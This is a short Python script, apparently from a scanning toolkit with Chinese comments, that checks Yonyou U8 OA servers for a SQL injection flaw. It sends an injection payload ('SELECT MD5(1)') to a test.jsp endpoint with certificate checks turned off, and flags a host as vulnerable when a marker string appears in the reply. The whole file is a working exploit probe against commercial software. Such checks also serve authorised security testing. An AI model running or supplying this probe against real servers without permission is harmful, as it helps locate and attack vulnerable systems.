#!/usr/bin/env python
# coding=utf-8
#用友U8OAsql注入
import requests, threading
from termcolor import colored

requests.packages.urllib3.disable_warnings()  # 忽略证书报错

results = ''
def pscan_vuln(url):
    urls = url
    global results
    try:
        response = requests.get(url=url +'/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))', verify=False,timeout=20)
        bm=response.encoding #获取网页编码
        response.encoding = str(bm) #设置网页编码
        if '序号' in response.text:
            print(colored('[+]存在用友U8OAsql注入', 'red'))
            results = f'{urls}-->存在用友U8OAsql注入'
        else:
            print('[-]不存在用友U8OAsql注入')
    except:
        print('[-]不存在用友U8OAsql注入')


def YPOA(urls):
    threads = []
    t = threading.Thread(target=pscan_vuln, args=(str(urls),))
    threads.append(t)
    t.start()
    for t in threads:
        t.join()
    return results